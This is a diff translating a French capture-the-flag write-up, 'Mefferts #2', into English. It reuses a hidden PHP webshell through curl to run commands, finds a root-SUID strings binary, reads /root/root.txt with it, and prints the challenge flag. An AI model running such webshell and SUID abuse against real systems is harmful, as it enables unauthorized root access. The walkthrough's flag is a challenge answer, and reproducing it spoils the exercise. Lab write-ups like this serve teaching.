@@ -1,56 +1,56 @@
 # Write-up : "Mefferts #2"
 
-**Cible :** 10.10.0.22 (même machine que "Mefferts", l'IP change à chaque redéploiement)
+**Target:** 10.10.0.22 (same machine as "Mefferts", the IP changes on every redeploy)
 
-**Objectif :** Obtenir root.txt
+**Objective:** Get root.txt
 
-**Difficulté :** Easy
+**Difficulty:** Medium
 
-**Date :** 15/09/2026
+**Date:** 15/09/2026
 
-**Techniques utilisées :** Réutilisation de la RCE existante, abus de binaire SUID root pour lire un fichier appartenant à root
+**Techniques used:** Reuse of the existing RCE, abuse of a root SUID binary to read a file owned by root
 
-**Outils utilisés :** curl
+**Tools used:** curl
 
-**Prérequis :** RCE en `www-data` obtenue lors de "Mefferts" (webshell `/my_very_secret_dir/index.php?cmd=` avec le cookie `login=uwe:thisisnotevennecessary`).
+**Prerequisites:** RCE as `www-data` obtained in "Mefferts" (webshell `/my_very_secret_dir/index.php?cmd=` with the cookie `login=uwe:thisisnotevennecessary`).
 
 ---
 
-## 1. Rappel du point d'appui
+## 1. Recap of the foothold
 
-On dispose déjà d'une RCE en `www-data` via le webshell caché découvert dans le write-up "Mefferts" :
+We already have an RCE as `www-data` via the hidden webshell discovered in the "Mefferts" write-up:
 
 ```bash
 curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=id" -b "login=uwe:thisisnotevennecessary"
 # uid=33(www-data)
 ```
 
-Rappel : dans une URL, `%20` = espace ; l'option `-b` envoie le cookie (obligatoire pour accéder à la page).
+Reminder: in a URL, `%20` = space; the `-b` option sends the cookie (required to access the page).
 
 ---
 
-## 2. L'escalade : le SUID `strings`
+## 2. The escalation: the `strings` SUID
 
-Lors de la recherche de binaires SUID, on avait trouvé un binaire anormal tournant en root :
+While searching for SUID binaries, we had found an abnormal binary running as root:
 
 ```bash
 curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=find / -perm -4000 -type f 2>/dev/null" -b "login=uwe:thisisnotevennecessary"
 # /usr/bin/x86_64-linux-gnu-strings
 ```
 
-**Faille exploitée :** binaire SUID root permettant la lecture de fichiers arbitraires (CWE-732).
+**Vulnerability exploited:** root SUID binary allowing arbitrary file reads (CWE-732).
 
-**Pourquoi ça marche :** comme `strings` s'exécute avec les privilèges de root (bit SUID), il peut lire des fichiers auxquels `www-data` n'a normalement pas accès, y compris `/root/root.txt`.
+**Why it works:** since `strings` runs with root privileges (SUID bit), it can read files that `www-data` normally has no access to, including `/root/root.txt`.
 
 ---
 
-## 3. Lecture de root.txt
+## 3. Reading root.txt
 
 ```bash
 curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=/usr/bin/x86_64-linux-gnu-strings /root/root.txt" -b "login=uwe:thisisnotevennecessary"
 ```
 
-**FLAG obtenu :**
+**FLAG obtained:**
 
 ```
 EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
@@ -58,25 +58,25 @@ EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| # | Faille | Catégorie (CWE) |
+| # | Vulnerability | Category (CWE) |
 | --- | --- | --- |
-| 1 | Webshell RCE réutilisé (www-data) | CWE-78 |
-| 2 | Binaire SUID root `strings` | CWE-732 |
+| 1 | Reused RCE webshell (www-data) | CWE-78 |
+| 2 | Root SUID binary `strings` | CWE-732 |
 
 ---
 
-## Résumé des étapes
+## Summary of steps
 
-1. On réutilise la RCE `www-data` du webshell (write-up "Mefferts").
-2. `find / -perm -4000` : on retrouve le SUID root `/usr/bin/x86_64-linux-gnu-strings`.
-3. `strings /root/root.txt` (exécuté en root grâce au SUID) : lecture du flag.
+1. We reuse the `www-data` RCE from the webshell ("Mefferts" write-up).
+2. `find / -perm -4000`: we find the root SUID `/usr/bin/x86_64-linux-gnu-strings`.
+3. `strings /root/root.txt` (executed as root thanks to the SUID): reading the flag.
 
 ---
 
 ## Conclusion
 
-- Même principe que le user.txt : on réutilise la RCE `www-data` et le binaire SUID `strings`.
-- Comme `strings` tourne en root, il lit `/root/root.txt` que `www-data` ne peut pas ouvrir.
-- **Flag root :** `EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}`
+- Same principle as the user.txt: we reuse the `www-data` RCE and the `strings` SUID binary.
+- Since `strings` runs as root, it reads `/root/root.txt` which `www-data` cannot open.
+- **Root flag:** `EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}`
